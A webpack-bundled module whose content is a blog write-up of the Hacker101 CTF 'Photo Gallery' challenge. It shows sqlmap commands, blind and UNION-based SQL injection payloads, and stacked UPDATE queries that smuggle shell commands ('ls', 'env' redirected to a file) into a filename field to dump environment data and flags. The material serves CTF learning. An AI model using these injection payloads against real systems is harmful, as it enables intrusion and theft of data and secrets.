exports.ids = [16];
exports.modules = {

/***/ "NpAA":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("---\ntitle: Hacker101 CTF Photo Gallery writeup\ndescription: A write up for the Photo Gallery [moderae] challenge\npublished: true\ndatePublished: 1609676431536\nauthor: lwlx\nauthorTwitter: \"0x0000005\"\nauthorPhoto: /profile.jpg\ntags:\n  - ctf\n  - writeup\n  - hackerone\n  - hacker101\n  - security\nthumbnailPhoto: /hackerone/hackerone.png\nbannerPhoto: /hackerone/hackerone.png\ncanonicalUrl:\n---\n\n# Photo Gallery _[moderate]_\n\nThis is my Write Up for the \"Photo Gallery\" challenge of HackerOne's CTF.\n\nAs usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.\nThe missing one is called `Invisible`, so lets look into that.\n\n```\nhttp://34.74.105.127/ad3e8c7df9/\n```\n\n![initial page](/hackerone/photogallery-start.png \"initial page\")\n\n## Information gathering\n\nwith Burp we were able to find that the server returns no content for this image.\nimages are loaded with a `GET` Request to the server like so:\n\n`GET /ad3e8c7df9/fetch?id=1 HTTP/1.1`\n\nthis also aligns with the first tip we are provided:\n\n> Hint 1: _Consider how you might build this system yourself. What would the **query for fetch** look like?_\n\nnaturally we start fuzzing the `id` parameter.\n\n```python\nGET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404\nGET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500\n```\n\nalright, no quick wins, so let's give it a try with fizzing using sqlmap.\nQuickly we are able to see that the server seems to be vulnerable to some attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\"\n```\n\nThis command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.\nwhen we are done we should know what to do next.\n\n## Gathered Data\n\n### sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:\n\n```python\nParameter: id (GET)\nType: boolean-based blind\nTitle: AND boolean-based blind - WHERE or HAVING clause\nPayload: id=2 AND 3567=3567\n\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)\n```\n\n```python\n[21:44:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.14.0\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n```\n\n### Our Target Server:\n\n    | Type      | Service      | Version                  | Vulnerable?    |\n    | --------- | ------------ | ------------------------ | -------------- |\n    | OS        | Linux Ubuntu | ??                       | not focused    |\n    | Webserver | Nginx        | 1.14.0                   | no             |\n    | Database  | MySQL        | >= 5.0.12 (MariaDB fork) | yes (id param) |\n\nGood, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=2\" -f --os=linux --dbms=mysql --level=3 -o\n```\n\nwe dont really get any more useful information from here.\nsoo.. were kinda stuck lets just get another hint then:\n\n> Hint 2: _Take a few minutes to consider the **state of the union**_\n\nThe state uf the union? are they hinting on using UNION statements in the query?\n_The UNION operator is used to combine the result-set of two or more SELECT statements._\nThat seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:\n\n`http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'`\n\nbut what do we look for? Lets get another hint.\n\n> Hint 3: _This application runs on the **uwsgi-nginx-flask-docker** image_\n\nuwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.\n\nhttps://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files\n\n> uWSGI can be configured using several different methods.\n\nYAML, JSON, INI are some supported formats -> ini beeing the defualt so lets try getting the 'uwsgi.ini' file?\n\n![union select wiht burp repeater](/hackerone/union-select-ini.png \"union select wiht burp repeater\")\n\nthis returns us some configdata pointing to module main which is the entrypoint.\n\n```python\n[uwsgi]\nmodule = main\ncallable = app\n```\n\nso lets see if we can also fethc the main.py\n\n```python\nhttp://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--\n```\n\nHere we get lots of infos our **first FLAG** and the db connection settings:\n\n### FLAG 0:\n\n```python\n%s\n' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\\n', 1)[-1] + '' rep += '\n\\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)\n# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80)\n```\n\n`return MySQLdb.connect(host=\"localhost\", user=\"root\", password=\"\", db=\"level5\")`\n\nwe also see that they are using the photos table\n\n`cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))`\n\nlets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.\n\n```python\nsqlmap -u \"http://34.74.105.127/ad3e8c7df9/fetch?id=1\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2\n```\n\nThis can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column `filename` since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.\n\n```python\nsqlmap -u \"http://35.190.155.168/c947e97f6e/fetch?id=3\" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename\n```\n\nThis means that sqlmap will start with the filename of id=3 which is exactly what we want right now.\n\n![starts to query filename of id 3](/hackerone/photo-gallery-hash.png \"query on the filename of id 3\")\nSo lets have a look at our results:\n\n```python\nDatabase: level5\nTable: photos\n[3 entries]\n+------------------------------------------------------------------+\n| filename |\n+------------------------------------------------------------------+\n| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |\n| files/adorable.jpg |\n| files/purrfect.jpg |\n+------------------------------------------------------------------+\n```\n\n> you might be getting partial values like so:\n> `9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????`\n> you should be able to re-run sqlmap to find the missing characters\n> `9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa`\n\ndecrypted: `\\*||+ls+-a+tmp.txt`\nanother file! nice lets try and get that with a UNION STATEMENT request like so:\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'tmp.txt'-- HTTP/1.1`\nhmm no luck it seems... let's do it another way.\n\nFrom our previous findings we know that files are in the 'files' directory and that we can run sql statements on the id param. So we want to try to move the file or its contents so we can access it. We also got a new hint of using ls output to find temp file.\n\nWe want to run following statements via the vulnerable param:\n\n#### ls in the /files directory and store data in bigWin.txt\n\n`update photos set filename='* || ls ./files >bigWin.txt ' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\\*%20||%20ls%20./files%20%3EbigWin.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1`\n\n#### store all env data in bigWin.txt (because so often flags are here)\n\n`update photos set filename='* || env >bigWin.txt' where id=3; commit;`\n\n`GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename%3D%27*%20%7C%7C%20env%20%3Etmp.txt%27%20where%20id%3D3%3B%20commit%3B%20-- HTTP/1.1`\n\nafter you succsessfully ran those you should be able to run the union select again to get ahold of bigWin.txt!\n\n`GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'bigWin.txt'-- HTTP/1.1`\n\nTadaa!! we got it all.\n\n```bash\n\"^FLAG^9ef8fc5da15????????????????????????????????????????????782ca11fa$FLAG$\"\n\"^FLAG^63a407d0083????????????????????????????????????????????4564ee9f2$FLAG$\"\nHOSTNAME=ad3e8c7df92d\nSHLVL=0\n```\n");

/***/ })

};;